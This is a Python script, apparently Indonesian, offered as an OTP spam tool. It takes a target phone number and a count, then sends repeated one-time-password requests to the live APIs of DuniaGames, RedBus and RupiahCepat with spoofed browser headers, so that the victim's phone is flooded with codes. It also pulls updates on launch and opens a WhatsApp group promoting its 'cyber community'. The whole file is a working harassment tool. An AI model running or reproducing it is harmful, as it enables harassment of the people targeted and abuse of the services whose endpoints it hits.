# Jangan Lupa Subscribe Mr_Dark :)
# Recode Sebelum Subscribe? ANAK HARAM!!




import os,sys,time,requests,json,random
from requests import post
from requests import get
os.system("git pull")
r = requests.Session()
def mr_x():
    time.sleep(1)
    os.system("clear")
    print ("\033[1;36mImportant Info:")
    print ("\033[1;32m1. \033[1;33mWelcome To Spam Multi Otp\033[31m")
    time.sleep(3)
    print ("\033[1;32m2. \033[1;33mTim kami sekarang telah memiliki komunitas dalam grup whatsapp\033[31m")
    time.sleep(3)
    print ("\033[1;32m3. \033[1;33mSilahkan join jika anda ingin bergabung dengan komunitas cyber kami\033[31m")
    time.sleep(3)
    os.system("xdg-open https://chat.whatsapp.com/HftUxoNQPfvBeAZ4dJXILy")
    time.sleep(3)
    print ("\033[1;32m4. \033[1;33mTerimakasih Telah Bergabung Dengan komunitas kami\033[31m")
    time.sleep(3)
    os.system("clear")
def alok_mengpro():
    alok = input("   \033[1;37m\033[31m➤ \033[36m")
    if alok == "1":
         print ("\033[1;30m<═════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         telkom_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         inquiryId_telkom = "219424679"
         telkom = ("0"+telkom_0)
         dark={
         "phoneNumber":telkom,
         "inquiryId":inquiryId_telkom
         }
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=dark).text
             if 'Field ini harus diisi dengan nomor Telkomsel' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mNo Target Harus Menggunakan Telkomsel! \033[31m ')
                  time.sleep(2)
                  print ("\033[1;30m<═════════════[\033[1;33;41m • \033[1;37mSTOP \033[1;33m• \033[0m\033[1;30m]═══════════════>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi! \033[31m ')
             else:
                  print ('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
             countdownTimer(00, 60)
    elif alok == "2":
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         xl_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         xl = ("0"+xl_0)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         InquiryId_xl = "237992422"
         id_xl = "237775262"
         data={
         "inquiryId":InquiryId_xl,
         "phoneNumber":xl,
         "transactionId":id_xl
         }
         mr_dark={
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "Connection": "keep-alive",
         "Content-Length": "24",
         "content-type": "application/json",
         "Host": "cmsapi.mapclub.com",
         "Origin": "https://www.mapclub.com",
         "Referer": "https://www.mapclub.com/id/user/signup",
         "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-site",
         "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
         }
         dt = {"phone":xl}
         dtjs = json.dumps(dt)
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             url2 = 'https://m.redbus.id/api/getOtp?number='+xl+'&cc=62&whatsAppOpted=True'
             a = requests.get(url2,headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"}).text
             b = json.loads(a)["Message"]
             if b == 'OTP Sent Successfully':
                  print('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  time.sleep(5)
             else:
                  print('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37msilah kan coba lagi setelah 15 menit! \033[31m ')
                  break
    elif alok == "3":
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         no_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+no_0)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
         hd = {
         "accept": "text/html, application/xhtml+xml, application/json, */*",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "content-length": "166",
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         "origin": "https://h5.rupiahcepatweb.com",
         "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-site",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
         }
         dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
         data = json.dumps(dt)
         for i in range(int(jumlah)):
             a = r.post(url,headers=hd,data={"data":data}).text
             b = json.loads(a)["code"]
             if b == 0:
                  print('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  countdownTimer(00, 60)
             else:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mGagal! \033[31m ')
                  countdownTimer(00, 60)
    elif alok == "4":
         os.system("xdg-open https://chat.whatsapp.com/HftUxoNQPfvBeAZ4dJXILy")
         print (":)")
    else:
         time.sleep(2)
         print ("\033[1;37m[\033[31m•\033[1;37m] Command: "+alok+" not found")
         time.sleep(3)
         os.system("clear")
         banner_anjay_alok()
def banner_anjay_alok():

    print ("    \033[36m╔╦╗\033[1;37m┬ ┬┬ ┌┬┐┬   \033[36m  ╔═╗\033[1;37m┌┬┐┌─┐")
    print ("    \033[36m║║║\033[1;37m│ ││  │ │ \033[31m─── \033[36m║ ║ \033[1;37m│ ├─┘")
    print ("    \033[36m╩ ╩\033[1;37m└─┘┴─┘┴ ┴   \033[36m  ╚═╝ \033[1;37m┴ ┴")
    print ("")
    print ("    \033[1;37m\033[31m-\033[1;37m YouTube\033[31m:\033[1;37m\033[1;37m MR_DARK ")
    print ("    \033[1;37m\033[31m-\033[1;37m Github\033[31m:\033[1;37m\033[1;37m github.com/DARK-02 ")
    print ("")
    print ("   \033[1;37m\033[31m•\033[1;37m Status\033[31m:\033[1;37m\033[1;32m ONLINE")
    print ("   \033[1;37m\033[31m•\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m6")
    print ("")
    print ("    \033[1;37m\033[31m\033[1;33m1\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Target \033[31m(\033[36mDuniaGames\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m2\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Target \033[31m(\033[36mRedBus\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m3\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSpam Target \033[31m(\033[36mRupiahCepat\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m4\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mJoin Grup Dark Club \033[31m(\033[32mWA\033[31m) ")
    print ("")
    alok_mengpro()
def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'   \033[1;37m[\033[1;35m#\033[1;37m] waiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
        time.sleep(1)
        total_second -= 1

mr_telkom={
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
mr_x()
banner_anjay_alok()
